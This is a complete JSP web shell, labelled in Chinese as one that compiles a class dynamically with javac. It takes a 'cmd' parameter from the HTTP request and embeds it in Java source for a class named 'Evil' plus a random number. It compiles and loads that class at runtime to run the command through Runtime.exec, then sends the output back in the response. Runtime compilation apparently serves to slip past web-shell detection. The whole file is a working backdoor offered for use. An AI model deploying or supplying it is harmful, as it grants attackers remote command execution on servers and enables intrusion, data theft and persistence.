<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.nio.charset.Charset" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Locale" %>
<%@ page import="javax.tools.DiagnosticCollector" %>
<%@ page import="javax.tools.JavaCompiler" %>
<%@ page import="javax.tools.JavaFileObject" %>
<%@ page import="javax.tools.StandardJavaFileManager" %>
<%@ page import="javax.tools.ToolProvider" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.io.File" %>
<html>
<body>
<h2>javac动态编译class的JSP WebShell</h2>
<%
    String c = request.getParameter("cmd");
    String tmpPath = Files.createTempDirectory("xxxxx").toFile().getPath();
    JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
    DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector();
    StandardJavaFileManager standardJavaFileManager = javaCompiler
            .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
    int id = new Random().nextInt(10000000);
    StringBuilder stringBuilder = new StringBuilder()
            .append("import java.io.BufferedReader;\n")
            .append("import java.io.IOException;\n")
            .append("import java.io.InputStream;\n")
            .append("import java.io.InputStreamReader;\n")
            .append("public class Evil" + id + " {\n")
            .append("   public static String result = \"\";\n")
            .append("   public Evil" + id + "() throws Throwable  {\n")
            .append("        StringBuilder stringBuilder = new StringBuilder();\n")
            .append("        try {")
            .append("               BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"" + c + "\").getInputStream()));\n")
            .append("               String line;\n")
            .append("               while((line = bufferedReader.readLine()) != null) {\n")
            .append("                       stringBuilder.append(line).append(\"\\n\");\n")
            .append("               }\n")
            .append("               result = stringBuilder.toString();\n")
            .append("        } catch (Exception e) {\n")
            .append("              e.printStackTrace();\n")
            .append("        }\n")
            .append("        throw new Throwable(stringBuilder.toString());")
            .append("   }\n")
            .append("}");
    Files.write(Paths.get(tmpPath + File.separator + "Evil" +id + ".java"), stringBuilder.toString().getBytes());
    Iterable fileObject = standardJavaFileManager.getJavaFileObjects(tmpPath + File.separator + "Evil" +id + ".java");
    javaCompiler.getTask(null, standardJavaFileManager, diagnostics, null, null, fileObject).call();
    try {
        new URLClassLoader(new URL[]{new URL("file:" + tmpPath + File.separator)}).loadClass("Evil" + id).newInstance();
    } catch (Throwable e) {
        response.getOutputStream().write(e.getMessage().getBytes());
    }
%>
</body>
</html>